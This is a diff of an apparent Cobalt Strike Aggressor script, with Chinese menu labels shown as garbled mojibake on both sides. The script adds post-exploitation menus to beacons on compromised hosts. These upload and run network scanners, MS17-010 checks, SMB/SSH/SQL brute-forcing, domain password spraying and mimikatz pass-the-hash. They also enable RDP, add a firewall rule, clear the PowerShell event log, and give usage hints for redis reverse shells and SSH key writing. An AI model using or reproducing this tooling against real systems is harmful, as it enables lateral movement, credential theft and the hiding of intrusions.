-      $dialog = dialog("ÉÏ´« PsLoggedon", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &PsLoggedon);
-      dialog_description($dialog, "Î¢Èí¹Ù·½¹¤¾ß£¬¸Ã¹¤¾ßµÄÄ³Ğ©¹¦ÄÜĞèÒª¹ÜÀíÔ±È¨ÏŞ¡£ÏîÄ¿µØÖ·£ºhttps://docs.microsoft.com/zh-cn/sysinternals/downloads/psloggedon");
-      drow_text($dialog, "UploadPath",  "ÉÏ´«Â·¾¶: ");
-      dbutton_action($dialog, "ÉÏ´«");
+      $dialog = dialog("ä¸Šä¼  PsLoggedon", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &PsLoggedon);
+      dialog_description($dialog, "å¾®è½¯å®˜æ–¹å·¥å…·ï¼Œè¯¥å·¥å…·çš„æŸäº›åŠŸèƒ½éœ€è¦ç®¡ç†å‘˜æƒé™ã€‚é¡¹ç›®åœ°å€ï¼šhttps://docs.microsoft.com/zh-cn/sysinternals/downloads/psloggedon");
+      drow_text($dialog, "UploadPath",  "ä¸Šä¼ è·¯å¾„: ");
+      dbutton_action($dialog, "ä¸Šä¼ ");
       dialog_show($dialog);
     }
     sub PsLoggedon{
@@ -364,11 +364,11 @@ menu "Everything(½¨Á¢http·şÎñÎÄ¼şËÑË÷)" {
 				bupload($bid, script_resource("/modules/InfoCollection/LocalAd/x86/PsLoggedon.exe"));
 			}
     }
-    item "ÔËĞĞPsLoggedon"{
+    item "è¿è¡ŒPsLoggedon"{
       bshell($bid, "PsLoggedon.exe");
       bshell($bid, "PsLoggedon64.exe");
     }
-    item "É¾³ıPsLoggedon"{
+    item "åˆ é™¤PsLoggedon"{
       local('$bid');
       foreach $bid ($1){
         bshell($1, "del /f /s /q PsLoggedon.exe");
@@ -383,22 +383,22 @@ menu "Everything(½¨Á¢http·şÎñÎÄ¼şËÑË÷)" {
   }
 
   menu "netview" {
-    item "ÉÏ´«netview" {
+    item "ä¸Šä¼ netview" {
       $bid = $1;
-      $dialog = dialog("ÉÏ´«netview", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &netview);
-      dialog_description($dialog, "¾ø´ó²¿·Ö¹¦ÄÜ²»ĞèÒª¹ÜÀíÔ±È¨ÏŞ¡£ÏîÄ¿µØÖ·£ºhttps://github.com/mubix/netview");
-      drow_text($dialog, "UploadPath",  "ÉÏ´«Â·¾¶: ");
-      dbutton_action($dialog, "ÉÏ´«");
+      $dialog = dialog("ä¸Šä¼ netview", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &netview);
+      dialog_description($dialog, "ç»å¤§éƒ¨åˆ†åŠŸèƒ½ä¸éœ€è¦ç®¡ç†å‘˜æƒé™ã€‚é¡¹ç›®åœ°å€ï¼šhttps://github.com/mubix/netview");
+      drow_text($dialog, "UploadPath",  "ä¸Šä¼ è·¯å¾„: ");
+      dbutton_action($dialog, "ä¸Šä¼ ");
       dialog_show($dialog);
     }
     sub netview {
       bupload($bid, script_resource("/modules/InfoCollection/LocalAd/netview.exe"));
     }
-    item "ÔËĞĞnetview"{
+    item "è¿è¡Œnetview"{
       $bid = $1['@'];
-      $Dialog = dialog("ÔËĞĞnetview",%(domain => "xxx.com",bid => $bid),&netview_run);
+      $Dialog = dialog("è¿è¡Œnetview",%(domain => "xxx.com",bid => $bid),&netview_run);
       drow_text($Dialog, "domain", "domain: ");
-      dbutton_action($Dialog, "ÔËĞĞ");
+      dbutton_action($Dialog, "è¿è¡Œ");
       dialog_show($Dialog);
     }
     sub netview_run{
@@ -406,7 +406,7 @@ menu "Everything(½¨Á¢http·şÎñÎÄ¼şËÑË÷)" {
       $Name = $3['domain'];
       bshell($bid, "netview.exe -d   $+ $Name");
     }
-    item "É¾³ınetview"{
+    item "åˆ é™¤netview"{
       local('$bid');
       foreach $bid ($1){
         bshell($1, "del /f /s /q netview.exe");
@@ -418,10 +418,10 @@ menu "Everything(½¨Á¢http·şÎñÎÄ¼şËÑË÷)" {
 
 }
 
-	 item "OXID½âÎöµØÖ·"{
+	 item "OXIDè§£æåœ°å€"{
   	$dialog = dialog("OXID",%(bid => $1["@"] , netversion => "4.0" , IP => "192.168.10.1/24") ,&OXID);
-		dialog_description($dialog,"Í¨¹ıOXID»ñÈ¡Ô¶³ÌÖ÷»úÍø¿¨µØÖ·");
-		drow_combobox($dialog,"netversion","°æ±¾:",@("4.0","3.0"));
+		dialog_description($dialog,"é€šè¿‡OXIDè·å–è¿œç¨‹ä¸»æœºç½‘å¡åœ°å€");
+		drow_combobox($dialog,"netversion","ç‰ˆæœ¬:",@("4.0","3.0"));
 		drow_text($dialog,"IP","IP:");
 		dbutton_action($dialog,"Exploit");
 		dialog_show($dialog);
@@ -432,16 +432,16 @@ menu "Everything(½¨Á¢http·şÎñÎÄ¼şËÑË÷)" {
 	}
 
 	separator();
-	menu "ÄÚÍøÌ½²â" {
+	menu "å†…ç½‘æ¢æµ‹" {
 
-	item "SharpWebScan(Ì½²âweb·şÎñ)" {
+	item "SharpWebScan(æ¢æµ‹webæœåŠ¡)" {
     $bid = $1['@'];
     $dialog = dialog("SharpWebScan", %(iptype => "-IP",ip => beacon_info($bid,"internal"),port => "80,443,7001,8000,8001,8080,8888",bid => $bid), &SharpWebScan);
-    dialog_description($dialog, "É¨ÃèIP»òC¶ÎµÄWeb·şÎñ£¬»ñÈ¡Title£¬¿É×Ô¶¨Òå¶à¶Ë¿ÚÉ¨Ãè£¬·µ»ØwebµØÖ·ºÍtitle¡£ÏîÄ¿µØÖ·£ºhttps://github.com/RcoIl/CSharp-Tools/tree/master/SharpWebScan");
+    dialog_description($dialog, "æ‰«æIPæˆ–Cæ®µçš„WebæœåŠ¡ï¼Œè·å–Titleï¼Œå¯è‡ªå®šä¹‰å¤šç«¯å£æ‰«æï¼Œè¿”å›webåœ°å€å’Œtitleã€‚é¡¹ç›®åœ°å€ï¼šhttps://github.com/RcoIl/CSharp-Tools/tree/master/SharpWebScan");
     drow_text($dialog, "ip", "ip:  ");
     drow_text($dialog, "port", "ports:  ");
     drow_combobox($dialog, "iptype", "-ip/-cip", @("-IP", "-CIP"));
-    dbutton_action($dialog, "ÔËĞĞ");
+    dbutton_action($dialog, "è¿è¡Œ");
     dialog_show($dialog);
   }
   sub SharpWebScan {
@@ -449,13 +449,13 @@ menu "Everything(½¨Á¢http·şÎñÎÄ¼şËÑË÷)" {
     bexecute_assembly($bid, script_resource("/modules/InfoCollection/NetScan/SharpWebScan.exe"), $arg);
   }
 
-  menu "TailorScan(·ìºÏ¹ÖÄÚÍøÉ¨ÃèÆ÷)" {
-    item "ÉÏ´«TailorScan" {
+  menu "TailorScan(ç¼åˆæ€ªå†…ç½‘æ‰«æå™¨)" {
+    item "ä¸Šä¼ TailorScan" {
       $bid = $1;
-      $dialog = dialog("ÉÏ´«TailorScan", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &TailorScan);
-      dialog_description($dialog, "Ö§³Ö¶Ë¿ÚÉ¨Ãè£¬Ê¶±ğ·şÎñ£¬»ñÈ¡title£¬É¨Ãè¶àÍø¿¨£¬ms17010É¨Ãè£¬icmp´æ»îÌ½²â¡£ÏîÄ¿µØÖ·£ºhttps://github.com/uknowsec/TailorScan");
-      drow_text($dialog, "UploadPath",  "ÉÏ´«Â·¾¶: ");
-      dbutton_action($dialog, "ÉÏ´«");
+      $dialog = dialog("ä¸Šä¼ TailorScan", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &TailorScan);
+      dialog_description($dialog, "æ”¯æŒç«¯å£æ‰«æï¼Œè¯†åˆ«æœåŠ¡ï¼Œè·å–titleï¼Œæ‰«æå¤šç½‘å¡ï¼Œms17010æ‰«æï¼Œicmpå­˜æ´»æ¢æµ‹ã€‚é¡¹ç›®åœ°å€ï¼šhttps://github.com/uknowsec/TailorScan");
+      drow_text($dialog, "UploadPath",  "ä¸Šä¼ è·¯å¾„: ");
+      dbutton_action($dialog, "ä¸Šä¼ ");
       dialog_show($dialog);
     }
     sub TailorScan {
@@ -465,134 +465,134 @@ menu "Everything(½¨Á¢http·şÎñÎÄ¼şËÑË÷)" {
         bupload($bid, script_resource("/modules/InfoCollection/NetScan/x86/TailorScan.exe"));
       }
     }
-    item "ÔËĞĞTailorScan"{
+    item "è¿è¡ŒTailorScan"{
 			$bid = $1['@'];
       btask($bid, " ", "");
       btask($bid, "TailorScan.exe", "");
       btask($bid, " ", "");
-      btask($bid, "É¨ÃèIP¸ñÊ½Ö§³Ö£º", "");
+      btask($bid, "æ‰«æIPæ ¼å¼æ”¯æŒï¼š", "");
       btask($bid, "   192.168.1.1", "");
       btask($bid, "   192.168.1.1-10", "");
       btask($bid, "   192.168.1.*", "");
       btask($bid, "   192.168.1.0/24", "");
       btask($bid, " ", "");
-      btask($bid, "¶Ë¿ÚÖ§³Ö×Ô¶¨ÒåÁĞ±í£¬ÓÃ','·Ö¸ô£¬Èç£º", "");
+      btask($bid, "ç«¯å£æ”¯æŒè‡ªå®šä¹‰åˆ—è¡¨ï¼Œç”¨','åˆ†éš”ï¼Œå¦‚ï¼š", "");
       btask($bid, "   21,22,80-99,8000-8080", "");
       btask($bid, " ", "");
-      btask($bid, "¶Ë¿ÚÉ¨Ãè£¬Ö§³Ötcp¡¢icmp:", "");
+      btask($bid, "ç«¯å£æ‰«æï¼Œæ”¯æŒtcpã€icmp:", "");
       btask($bid, "   TailorScan.exe portscan 192.168.0.1/24 80,8080 tcp", "");
       btask($bid, "   TailorScan.exe portscan 192.168.0.1/24 tcp", "");
       btask($bid, " ", "");
-      btask($bid, "ÓÀºãÖ®À¶Ì½²â£º", "");
+      btask($bid, "æ°¸æ’ä¹‹è“æ¢æµ‹ï¼š", "");
       btask($bid, "   TailorScan.exe ms17010 -i 192.168.0.1", "");
       btask($bid, "   TailorScan.exe ms17010 -n 192.168.0.1/24", "");
       btask($bid, " ", "");
-      btask($bid, "OXID Find£º", "");
+      btask($bid, "OXID Findï¼š", "");
       btask($bid, "   TailorScan.exe oxidfind -i 192.168.0.1", "");
       btask($bid, "   TailorScan.exe oxidfind -n 192.168.0.1/24", "");
       btask($bid, " ", "");
-      btask($bid, "ICMP check£º", "");
+      btask($bid, "ICMP checkï¼š", "");
       btask($bid, "   TailorScan.exe icmpcheck 192.168.0.1/24", "");
       btask($bid, " ", "");
-			$dialog = dialog("ÔËĞĞTailorScan",%(exec => "TailorScan.exe ms17010 -n 192.168.0.1/24", bid => $bid),&TailorScan_run);
-			dialog_description($dialog, "×¢Òâ¿ØÖÆÌ¨Êä³öµÄÊ¹ÓÃËµÃ÷£¬Ö±½ÓÔÚÏÂ·½ÊäÈëÖ´ĞĞÖ¸Áî£º");
+			$dialog = dialog("è¿è¡ŒTailorScan",%(exec => "TailorScan.exe ms17010 -n 192.168.0.1/24", bid => $bid),&TailorScan_run);
+			dialog_description($dialog, "æ³¨æ„æ§åˆ¶å°è¾“å‡ºçš„ä½¿ç”¨è¯´æ˜ï¼Œç›´æ¥åœ¨ä¸‹æ–¹è¾“å…¥æ‰§è¡ŒæŒ‡ä»¤ï¼š");
       drow_text($dialog, "exec", "Exec: ");
-			dbutton_action($dialog, "ÔËĞĞ");
+			dbutton_action($dialog, "è¿è¡Œ");
 			dialog_show($dialog);
 		}
 		sub TailorScan_run{
       $exec = $3['exec'];
 			bshell($bid, "$exec");
 		}
-    item "É¾³ıTailorScan"{
+    item "åˆ é™¤TailorScan"{
 			$bid = $1['@'];
       bshell($bid, "taskkill -f /im TailorScan.exe & del /f /s /q TailorScan.exe");
     }
   }
 
   menu "fscan" {
-    item "ÉÏ´«fscan" {
+    item "ä¸Šä¼ fscan" {
       $bid = $1;
-      $dialog = dialog("ÉÏ´«fscan", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &fscan);
-      dialog_description($dialog, "¾­²âÊÔÈôÓĞ360»á±»É±£¬Ö§³ÖÖ÷»ú´æ»îÌ½²â¡¢¶Ë¿ÚÉ¨Ãè¡¢³£¼û·şÎñµÄ±¬ÆÆ¡¢ms17010¡¢redisÅúÁ¿Ğ´Ë½Ô¿¡¢¼Æ»®ÈÎÎñ·´µ¯shell¡¢¶ÁÈ¡winÍø¿¨ĞÅÏ¢µÈ¡£ÏîÄ¿µØÖ·£ºhttps://github.com/shadow1ng/fscan");
-      drow_text($dialog, "UploadPath",  "ÉÏ´«Â·¾¶: ");
-      dbutton_action($dialog, "ÉÏ´«");
+      $dialog = dialog("ä¸Šä¼ fscan", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &fscan);
+      dialog_description($dialog, "ç»æµ‹è¯•è‹¥æœ‰360ä¼šè¢«æ€ï¼Œæ”¯æŒä¸»æœºå­˜æ´»æ¢æµ‹ã€ç«¯å£æ‰«æã€å¸¸è§æœåŠ¡çš„çˆ†ç ´ã€ms17010ã€redisæ‰¹é‡å†™ç§é’¥ã€è®¡åˆ’ä»»åŠ¡åå¼¹shellã€è¯»å–winç½‘å¡ä¿¡æ¯ç­‰ã€‚é¡¹ç›®åœ°å€ï¼šhttps://github.com/shadow1ng/fscan");
+      drow_text($dialog, "UploadPath",  "ä¸Šä¼ è·¯å¾„: ");
+      dbutton_action($dialog, "ä¸Šä¼ ");
       dialog_show($dialog);
     }
     sub fscan {
       bupload($bid, script_resource("/modules/InfoCollection/NetScan/fscan.exe"));
     }
-    item "ÔËĞĞfscan"{
+    item "è¿è¡Œfscan"{
 			$bid = $1['@'];
-      btask($bid, "¼òµ¥ÓÃ·¨£º", "");
-      btask($bid, "fscan.exe -h 192.168.1.1/24                      (Ä¬ÈÏÊ¹ÓÃÈ«²¿Ä£¿é)", "");
-      btask($bid, "fscan.exe -h 192.168.1.1/24 -rf id_rsa.pub       (redis Ğ´Ë½Ô¿)", "");
-      btask($bid, "fscan.exe -h 192.168.1.1/24 -rs 192.168.1.1:6666 (redis ¼Æ»®ÈÎÎñ·´µ¯shell)", "");
-      btask($bid, "fscan.exe -h 192.168.1.1/24 -c whoami            (ssh ±¬ÆÆ³É¹¦ºó£¬ÃüÁîÖ´ĞĞ)", "");
-      btask($bid, "fscan.exe -h 192.168.1.1/24 -m ssh -p 2222       (Ö¸¶¨Ä£¿ésshºÍ¶Ë¿Ú)", "");
-      btask($bid, "fscan.exe -h 192.168.1.1/24 -m ms17010           (Ö¸¶¨Ä£¿é)", "");
+      btask($bid, "ç®€å•ç”¨æ³•ï¼š", "");
+      btask($bid, "fscan.exe -h 192.168.1.1/24                      (é»˜è®¤ä½¿ç”¨å…¨éƒ¨æ¨¡å—)", "");
+      btask($bid, "fscan.exe -h 192.168.1.1/24 -rf id_rsa.pub       (redis å†™ç§é’¥)", "");
+      btask($bid, "fscan.exe -h 192.168.1.1/24 -rs 192.168.1.1:6666 (redis è®¡åˆ’ä»»åŠ¡åå¼¹shell)", "");
+      btask($bid, "fscan.exe -h 192.168.1.1/24 -c whoami            (ssh çˆ†ç ´æˆåŠŸåï¼Œå‘½ä»¤æ‰§è¡Œ)", "");
+      btask($bid, "fscan.exe -h 192.168.1.1/24 -m ssh -p 2222       (æŒ‡å®šæ¨¡å—sshå’Œç«¯å£)", "");
+      btask($bid, "fscan.exe -h 192.168.1.1/24 -m ms17010           (æŒ‡å®šæ¨¡å—)", "");
       btask($bid, " ", "");
-      btask($bid, "-h 192.168.1.1/24 (C¶Î)", "");
-      btask($bid, "-h 192.168.1.1/16 (B¶Î)", "");
-      btask($bid, "-h 192.168.1.1/8  (A¶ÎµÄ192.x.x.1ºÍ192.x.x.254,·½±ã¿ìËÙ²é¿´Íø¶ÎĞÅÏ¢)", "");
-      btask($bid, "-hf ip.txt        (ÒÔÎÄ¼şµ¼Èë)", "");
+      btask($bid, "-h 192.168.1.1/24 (Cæ®µ)", "");
+      btask($bid, "-h 192.168.1.1/16 (Bæ®µ)", "");
+      btask($bid, "-h 192.168.1.1/8  (Aæ®µçš„192.x.x.1å’Œ192.x.x.254,æ–¹ä¾¿å¿«é€ŸæŸ¥çœ‹ç½‘æ®µä¿¡æ¯)", "");
+      btask($bid, "-hf ip.txt        (ä»¥æ–‡ä»¶å¯¼å…¥)", "");
       btask($bid, " ", "");
-      btask($bid, "fscan.exe -h      (²é¿´ÍêÕûÊ¹ÓÃ·½·¨)", "");
+      btask($bid, "fscan.exe -h      (æŸ¥çœ‹å®Œæ•´ä½¿ç”¨æ–¹æ³•)", "");
       btask($bid, " ", "");
-      $dialog = dialog("ÔËĞĞfscan",%(exec => "fscan.exe -h 192.168.1.1/24", bid => $bid),&fscan_run);
-			dialog_description($dialog, "×¢Òâ¿ØÖÆÌ¨Êä³öµÄÊ¹ÓÃËµÃ÷£¬Ö±½ÓÔÚÏÂ·½ÊäÈëÖ´ĞĞÖ¸Áî£º");
+      $dialog = dialog("è¿è¡Œfscan",%(exec => "fscan.exe -h 192.168.1.1/24", bid => $bid),&fscan_run);
+			dialog_description($dialog, "æ³¨æ„æ§åˆ¶å°è¾“å‡ºçš„ä½¿ç”¨è¯´æ˜ï¼Œç›´æ¥åœ¨ä¸‹æ–¹è¾“å…¥æ‰§è¡ŒæŒ‡ä»¤ï¼š");
       drow_text($dialog, "exec", "Exec: ");
-			dbutton_action($dialog, "ÔËĞĞ");
+			dbutton_action($dialog, "è¿è¡Œ");
 			dialog_show($dialog);
 		}
     sub fscan_run{
       $exec = $3['exec'];
 			bshell($bid, "$exec");
 		}
-    item "É¾³ıfscan"{
+    item "åˆ é™¤fscan"{
 			$bid = $1['@'];
       bshell($bid, "taskkill -f /im fscan.exe & del /f /s /q fscan.exe");
     }
   }
 
 
-  menu "crack±¬ÆÆ" {
-    item "ÉÏ´«crack" {
+  menu "crackçˆ†ç ´" {
+    item "ä¸Šä¼ crack" {
       $bid = $1;
-      $dialog = dialog("ÉÏ´«crack", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &crack);
-      dialog_description($Dialog, "Ö§³Ö±¬ÆÆftp£¬ssh£¬smb£¬mssql£¬mysql, postgresql,±¬ÆÆÍê±Ï»áÔÚµ±Ç°Ä¿Â¼Éú³Éresult.txt¡£forkµØÖ·£ºhttps://github.com/oksbsb/crack");
-      drow_text($dialog, "UploadPath",  "ÉÏ´«Â·¾¶: ");
-      dbutton_action($dialog, "ÉÏ´«");
+      $dialog = dialog("ä¸Šä¼ crack", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &crack);
+      dialog_description($Dialog, "æ”¯æŒçˆ†ç ´ftpï¼Œsshï¼Œsmbï¼Œmssqlï¼Œmysql, postgresql,çˆ†ç ´å®Œæ¯•ä¼šåœ¨å½“å‰ç›®å½•ç”Ÿæˆresult.txtã€‚forkåœ°å€ï¼šhttps://github.com/oksbsb/crack");
+      drow_text($dialog, "UploadPath",  "ä¸Šä¼ è·¯å¾„: ");
+      dbutton_action($dialog, "ä¸Šä¼ ");
       dialog_show($dialog);
     }
     sub crack {
       bupload($bid, script_resource("/modules/InfoCollection/NetScan/crack.exe"));
     }
-    item "ÔËĞĞcrack"{
+    item "è¿è¡Œcrack"{
       $bid = $1['@'];
       btask($bid, " ", "");
       btask($bid, "-i string", "");
-      btask($bid, "   ip addr 192.168.1.1/24£¬192.168.1-255£¬192.168.1.1", "");
+      btask($bid, "   ip addr 192.168.1.1/24ï¼Œ192.168.1-255ï¼Œ192.168.1.1", "");
       btask($bid, "-p string", "");
-      btask($bid, "   port 21,22£¬445£¬3306£¬1433", "");
+      btask($bid, "   port 21,22ï¼Œ445ï¼Œ3306ï¼Œ1433", "");
       btask($bid, "-U string", "");
       btask($bid, "   filename list or username", "");
       btask($bid, "-P string", "");
       btask($bid, "   filename list or username", "");
       btask($bid, "-s string", "");
-      btask($bid, "   service ftp  ssh£¬smb£¬mssql£¬mysql, postgresql   default  only scan tcp port (default \"scan\")", "");
+      btask($bid, "   service ftp  sshï¼Œsmbï¼Œmssqlï¼Œmysql, postgresql   default  only scan tcp port (default \"scan\")", "");
       btask($bid, "-t int", "");
       btask($bid, "   thread (default 100)", "");
       btask($bid, " ", "");
-      $Dialog = dialog("ÔËĞĞcrack",%(ip => "192.168.1.1/24", port => "445", username => "filename list or username", password => "filename list or password", type => "smb", thread => "100",bid => $bid),&crack_run);
-      dialog_description($Dialog, "Ö§³Ö±¬ÆÆftp£¬ssh£¬smb£¬mssql£¬mysql, postgresql,±¬ÆÆÍê±Ï»áÔÚµ±Ç°Ä¿Â¼Éú³Éresult.txt¡£");
+      $Dialog = dialog("è¿è¡Œcrack",%(ip => "192.168.1.1/24", port => "445", username => "filename list or username", password => "filename list or password", type => "smb", thread => "100",bid => $bid),&crack_run);
+      dialog_description($Dialog, "æ”¯æŒçˆ†ç ´ftpï¼Œsshï¼Œsmbï¼Œmssqlï¼Œmysql, postgresql,çˆ†ç ´å®Œæ¯•ä¼šåœ¨å½“å‰ç›®å½•ç”Ÿæˆresult.txtã€‚");
       drow_text($Dialog, "ip", "ip: ");
       drow_text($Dialog, "port", "port: ");
       drow_text($Dialog, "username", "username: ");
       drow_text($Dialog, "password", "password: ");
       drow_text($Dialog, "type", "type: ");
       drow_text($Dialog, "thread", "thread: ");
-      dbutton_action($Dialog, "ÔËĞĞ");
+      dbutton_action($Dialog, "è¿è¡Œ");
       dialog_show($Dialog);
     }
     sub crack_run{
@@ -605,7 +605,7 @@ menu "Everything(½¨Á¢http·şÎñÎÄ¼şËÑË÷)" {
       $thread = $3['thread'];
       bshell($bid, "crack.exe -i  $+ $Name -p  $+ $port -U  $+ $username -P  $+ $password -s  $+ $type -t  $+ $thread");
     }
-    item "É¾³ıcrack"{
+    item "åˆ é™¤crack"{
       local('$bid');
       foreach $bid ($1){
         bshell($1, "taskkill -f /im crack.exe & del /f /s /q crack.exe");
@@ -613,15 +613,15 @@ menu "Everything(½¨Á¢http·şÎñÎÄ¼şËÑË÷)" {
     }
   }
 
-  item "SharpSpray(ÓòÄÚÃÜÂë±¬ÆÆ)" {
+  item "SharpSpray(åŸŸå†…å¯†ç çˆ†ç ´)" {
     $bid = $1['@'];
     $dialog = dialog("SharpSpray", %(passwd => "123,888",Delay => "1000",Sleep => "1",bid => $bid), &SharpSpray);
-    dialog_description($dialog, "Ê¹ÓÃLDAP¶ÔÓòµÄËùÓĞÓÃ»§Ö´ĞĞÃÜÂëÅçÎí¹¥»÷¡£seeds£ºÖ¸¶¨¼¸¸öÃÜÂëÉú³É×Öµä£¬¶ººÅ·Ö¸ô¡£passwords£ºÖ¸¶¨ÃÜÂë±¬ÆÆ£¬¿É¶à¸öÃÜÂë£¬¶ººÅ·Ö¸ô¡£delay£ºÃÜÂëÅçÎíµÄÑÓ³Ù£¬ºÁÃëÎªµ¥Î»¡£sleep£ºÃÜÂë²Â²âÖ®¼äsleepÖÜÆÚ·ÖÖÓÊı¡£ÏîÄ¿µØÖ·£ºhttps://github.com/jnqpblc/SharpSpray");
+    dialog_description($dialog, "ä½¿ç”¨LDAPå¯¹åŸŸçš„æ‰€æœ‰ç”¨æˆ·æ‰§è¡Œå¯†ç å–·é›¾æ”»å‡»ã€‚seedsï¼šæŒ‡å®šå‡ ä¸ªå¯†ç ç”Ÿæˆå­—å…¸ï¼Œé€—å·åˆ†éš”ã€‚passwordsï¼šæŒ‡å®šå¯†ç çˆ†ç ´ï¼Œå¯å¤šä¸ªå¯†ç ï¼Œé€—å·åˆ†éš”ã€‚delayï¼šå¯†ç å–·é›¾çš„å»¶è¿Ÿï¼Œæ¯«ç§’ä¸ºå•ä½ã€‚sleepï¼šå¯†ç çŒœæµ‹ä¹‹é—´sleepå‘¨æœŸåˆ†é’Ÿæ•°ã€‚é¡¹ç›®åœ°å€ï¼šhttps://github.com/jnqpblc/SharpSpray");
     drow_combobox($dialog, "type", "type:", @("--Seeds","--Passwords"));
     drow_text($dialog, "passwd", "passwd:  ");
     drow_text($dialog, "Delay", "Delay:  ");
     drow_text($dialog, "Sleep", "Sleep:  ");
-    dbutton_action($dialog, "ÔËĞĞ");
+    dbutton_action($dialog, "è¿è¡Œ");
     dialog_show($dialog);
   }
   sub SharpSpray {
@@ -640,7 +640,7 @@ menu "Everything(½¨Á¢http·şÎñÎÄ¼şËÑË÷)" {
   	$dialog = dialog("Pass-The-Hash" , %(beacon => $1 , domain => "xxx.com" , user => "administrator" , hash => "hash") , lambda({
       bpassthehash($3["beacon"] , $3["domain"] , $3["user"] , $3["hash"]);
   	}));
-  	dialog_description($dialog, "mimikatz¹şÏ£´«µİ¹¥»÷¡£");
+  	dialog_description($dialog, "mimikatzå“ˆå¸Œä¼ é€’æ”»å‡»ã€‚");
   	drow_text($dialog, "beacon",  "Beacon:");
   	drow_text($dialog, "domain",  "Domain:");
   	drow_text($dialog, "user",  "User:");
@@ -650,9 +650,9 @@ menu "Everything(½¨Á¢http·şÎñÎÄ¼şËÑË÷)" {
   }
 	}
 	separator();
-	menu "RDPÏà¹Ø" {
+	menu "RDPç›¸å…³" {
 
-	item "»ñÈ¡RDP¶Ë¿Ú" {
+	item "è·å–RDPç«¯å£" {
     local('$bid');
     foreach $bid ($1){
       blog($1, "Check Rdp Open Port");
@@ -661,23 +661,23 @@ menu "Everything(½¨Á¢http·şÎñÎÄ¼şËÑË÷)" {
       bshell($bid,"wevtutil cl \"Windows PowerShell\"");
     }
   }
-  item "²é¿´RDPÊÇ·ñ¿ªÆô" {
-    blog($1, "ÇëÊÖ¶¯Ö´ĞĞ£ºshell netstat -ano | findstr \$RDP¶Ë¿Ú")
+  item "æŸ¥çœ‹RDPæ˜¯å¦å¼€å¯" {
+    blog($1, "è¯·æ‰‹åŠ¨æ‰§è¡Œï¼šshell netstat -ano | findstr \$RDPç«¯å£")
   }
 
-  item "¿ªÆôRDP·şÎñ" {
+  item "å¼€å¯RDPæœåŠ¡" {
     $bid = $1['@'];
     bshell($bid, "REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\" \"Server /v fDenyTSConnections /t REG_DWORD /d 0 /f");
     bshell($bid, "wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 1");
   }
 
-  item "¹Ø±ÕRDP·şÎñ" {
+  item "å…³é—­RDPæœåŠ¡" {
     $bid = $1['@'];
     bshell($bid, "REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\" \"Server /v fDenyTSConnections /t REG_DWORD /d 1 /f");
     bshell($bid, "wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 0");
   }
 
-  item "·À»ğÇ½·ÅĞĞRDP¹æÔò" {
+  item "é˜²ç«å¢™æ”¾è¡ŒRDPè§„åˆ™" {
     $bid = $1['@'];
     bshell($bid, "netsh advfirewall firewall add rule name=\"Remote Desktop\" protocol=TCP dir=in localport=3389 action=allow");
 	}
